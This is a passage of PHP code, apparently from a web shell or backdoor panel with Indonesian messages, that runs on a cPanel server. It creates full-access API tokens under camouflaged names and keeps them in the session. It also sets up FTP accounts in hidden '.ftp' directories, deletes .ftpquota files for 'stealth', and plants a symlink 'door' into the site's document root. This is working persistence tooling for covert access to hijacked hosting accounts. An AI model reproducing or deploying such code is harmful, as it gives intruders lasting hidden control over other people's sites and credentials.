    $r = fum_run_cmd('uapi Tokens create_full_access name=' . escapeshellarg($tokName));
    $last_label = 'UAPI CLI: Tokens create_full_access name=' . $tokName;
    $last_result = $r[0];
    $gt_clean = ($r[0] !== null) ? fum_sanitize_uapi_out($r[0]) : '';
    if ($gt_clean !== '' && preg_match('/token:\s*[\'"]?([A-Za-z0-9]+)[\'"]?/i', $gt_clean, $m) && fum_yaml_status($gt_clean) === true) {
        $dom = isset($_SERVER['HTTP_HOST']) ? preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST']) : '';
        $_SESSION['fum_cpdomain'] = $dom;
        $_SESSION['fum_cpuser'] = fum_detect_user();
        $_SESSION['fum_cptoken'] = $m[1];
        $_SESSION['fum_token_name'] = $tokName;
        if (!isset($_SESSION['fum_token_map']) || !is_array($_SESSION['fum_token_map'])) $_SESSION['fum_token_map'] = array();
        $_SESSION['fum_token_map'][$tokName] = $m[1];
        $msg = 'API Token otomatis dibuat & tersimpan (nama: ' . $tokName . ', via ' . $r[1] . ')';
    } else {
        $msg = 'Auto-token gagal: ' . ($r[0] !== null ? substr(trim($r[0]), 0, 200) : 'shell mati semua');
        $msg_type = 'err';
    }
}

/* ---------- ACTION: GANTI TOKEN BARU (revoke lama + create baru, nilai tampil) ---------- */
if (isset($_POST['act']) && $_POST['act'] == 'regen_token') {
    $old = isset($_POST['token_name']) ? trim($_POST['token_name']) : '';
    if ($old == '') {
        $msg = 'Nama token tidak valid'; $msg_type = 'err';
    } else {
        $r1 = fum_call('Tokens', 'revoke', array('name' => $old));
        $tokName = fum_camo_token_name();
        $r2 = fum_call('Tokens', 'create_full_access', array('name' => $tokName));
        $last_label = 'UAPI: Tokens revoke(' . $old . ') + create_full_access(' . $tokName . ')';
        $last_result = "=== REVOKE " . $old . " ===\n" . ($r1[2] != '' ? $r1[2] : $r1[1])
            . "\n\n=== CREATE " . $tokName . " ===\n" . ($r2[2] != '' ? $r2[2] : $r2[1]);
        $newtok = '';
        if ($r2[0]) {
            if (is_array($r2[1])) {
                $gres = isset($r2[1]['result']) ? $r2[1]['result'] : $r2[1];
                if (isset($gres['data']['token'])) $newtok = $gres['data']['token'];
            }
            if ($newtok == '' && preg_match('/token:\s*[\'"]?([A-Za-z0-9]+)[\'"]?/i', $r2[2], $m)) $newtok = $m[1];
        }
        if ($newtok != '') {
            $dom = (isset($_SESSION['fum_cpdomain']) && $_SESSION['fum_cpdomain'] != '') ? $_SESSION['fum_cpdomain']
                : (isset($_SERVER['HTTP_HOST']) ? preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST']) : '');
            $_SESSION['fum_cpdomain'] = $dom;
            $_SESSION['fum_cpuser'] = fum_detect_user();
            $_SESSION['fum_cptoken'] = $newtok;
            $_SESSION['fum_token_name'] = $tokName;
            if (!isset($_SESSION['fum_token_map']) || !is_array($_SESSION['fum_token_map'])) $_SESSION['fum_token_map'] = array();
            $_SESSION['fum_token_map'][$tokName] = $newtok;
            $msg = 'Token "' . $old . '" diganti token baru "' . $tokName . '" — nilainya tampil di blok Kredensial API & kolom Token';
            if (!$r1[0]) $msg .= ' (catatan: revoke token lama gagal: ' . $r1[4] . ')';
        } else {
            $msg = 'Ganti token gagal: ' . ($r2[4] != '' ? $r2[4] : 'nilai token tidak terbaca dari output');
            $msg_type = 'err';
        }
    }
}

/* ---------- ACTION: CREATE FTP ---------- */
if (isset($_POST['act']) && $_POST['act'] == 'add') {
    $fuser = isset($_POST['ftp_user']) ? trim($_POST['ftp_user']) : '';
    $fpass = isset($_POST['ftp_pass']) ? $_POST['ftp_pass'] : '';
    $fdir  = isset($_POST['ftp_dir']) ? trim($_POST['ftp_dir']) : '';
    $fquota = isset($_POST['ftp_quota']) ? trim($_POST['ftp_quota']) : '0';
    if ($fuser == '' || $fpass == '') {
        $msg = 'Username & password FTP wajib diisi'; $msg_type = 'err';
    } else {
        $mklink = false;
        if ($fdir == 'home') $fdir = '';
        elseif ($fdir == 'hidesym') { $fdir = '.ftp' . fum_rand_str(8); $mklink = true; }
        elseif ($fdir == '' || $fdir == '~') $fdir = fum_self_rel();
        $args = array('user' => $fuser, 'pass' => $fpass);
        if ($fdir != '') $args['homedir'] = $fdir;
        if ($fquota != '' && $fquota != '0') $args['quota'] = $fquota;
        $fn_add = fum_ftp_fname('add');
        $r = fum_call('Ftp', $fn_add, $args);
        $last_label = 'UAPI: Ftp::' . $fn_add . ($r[3] != '' ? ' (via ' . $r[3] . ')' : '');
        $last_result = $r[2] != '' ? $r[2] : $r[1];
        if ($r[0]) {
            $msg = 'Akun FTP "' . $fuser . '" berhasil dibuat';
            $_SESSION['fum_flash_user'] = $fuser;
            $_SESSION['fum_flash_pass'] = $fpass;
            if (!isset($_SESSION['fum_pass_map']) || !is_array($_SESSION['fum_pass_map']))
                $_SESSION['fum_pass_map'] = array();
            $_SESSION['fum_pass_map'][$fuser] = $fpass;
            $qok = fum_rm_ftpquota(fum_abs_dir($fdir));
            $msg .= $qok ? ' | .ftpquota dibersihkan (stealth)' : ' | .ftpquota GAGAL dihapus';
            if ($mklink) {
                $target = fum_home_dir() . '/' . fum_self_rel();
                $link = fum_abs_dir($fdir) . '/public_html';
                $lok = false;
                if (!fum_disabled('symlink')) $lok = @symlink($target, $link);
                if (!$lok && !@is_link($link)) fum_run_cmd('ln -s ' . escapeshellarg($target) . ' ' . escapeshellarg($link));
                $msg .= @is_link($link)
                    ? ' | homedir tersembunyi "' . $fdir . '" berisi pintu "public_html" — login lalu masuk folder itu = docroot'
                    : ' | symlink pintu GAGAL dibuat';
            }
        }
        else { $msg = 'Gagal buat akun: ' . ($r[4] != '' ? $r[4] : 'unknown'); $msg_type = 'err'; }
